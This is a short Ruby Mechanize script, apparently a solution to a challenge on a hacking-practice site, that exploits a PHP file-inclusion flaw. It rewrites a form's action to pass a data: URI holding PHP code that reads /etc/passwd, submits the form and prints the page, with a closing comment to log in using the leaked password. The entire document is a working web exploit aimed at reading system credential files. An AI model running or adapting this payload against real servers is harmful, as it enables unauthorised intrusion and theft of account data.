#!/usr/bin/ruby
require 'mechanize'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/take43.php')
mech.get(uri)
form=mech.page.form_with(:action=>'/hack/take43.php?file=take43.html')
#reference: http://d.hatena.ne.jp/t_komura/20070128/1170004898
form.action="/hack/take43.php?file=data:text/plain,<?php file_get_contents('/etc/passwd');?>"
form.input_id='foo'
form.pass='bar'
form.submit
puts mech.page.body
#Now login with printed password.